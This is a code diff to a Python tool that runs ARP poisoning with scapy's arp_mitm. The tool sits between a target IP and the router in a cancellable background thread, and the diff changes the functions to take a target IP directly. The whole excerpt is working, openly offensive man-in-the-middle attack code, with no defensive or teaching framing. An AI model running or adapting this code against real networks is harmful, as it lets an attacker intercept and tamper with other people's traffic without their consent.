@@ -21,12 +21,11 @@ def spoofing(target, spoofed):
     scapy.send(packet, verbose=False)
 
 
-def arp_poisoning_loop(interface_to_poison, target_device, router_ip, printing_queue, verbosity, cancel_token):
+def arp_poisoning_loop(interface_to_poison, target_ip, router_ip, printing_queue, verbosity, cancel_token):
+    print(f"Starting spoofing: {target_ip} <- {router_ip}")
     while not cancel_token.is_set():
         try:
-            print(f"Starting spoofing: {target_device['ip']} <- {router_ip}")
-
-            arp_mitm(router_ip, target_device['ip'], iface=interface_to_poison)
+            arp_mitm(router_ip, target_ip, iface=interface_to_poison)
             # spoofing(target_device["ip"], router_ip)
             # spoofing(router_ip, target_device["ip"])
 
@@ -41,8 +40,11 @@ def arp_poisoning_loop(interface_to_poison, target_device, router_ip, printing_q
         except Exception as e:
             print(f"[ERROR] {e}")
 
-def start_arp_poisoning(interface_to_poison, target_device, router_ip, printing_queue, verbosity):
+def start_arp_poisoning(interface_to_poison, target_ip, router_ip, printing_queue, verbosity):
     cancel_token = threading.Event()
-    arp_poisoning_thread = threading.Thread(target=arp_poisoning_loop, args=(interface_to_poison, target_device, router_ip, verbosity, printing_queue, cancel_token))
+    arp_poisoning_thread = threading.Thread(target=arp_poisoning_loop, args=(interface_to_poison, target_ip, router_ip, verbosity, printing_queue, cancel_token))
     arp_poisoning_thread.start()
     return cancel_token
+
+# if __name__ == "__main__":
+    # arp_poisoning_loop("wlan0", )
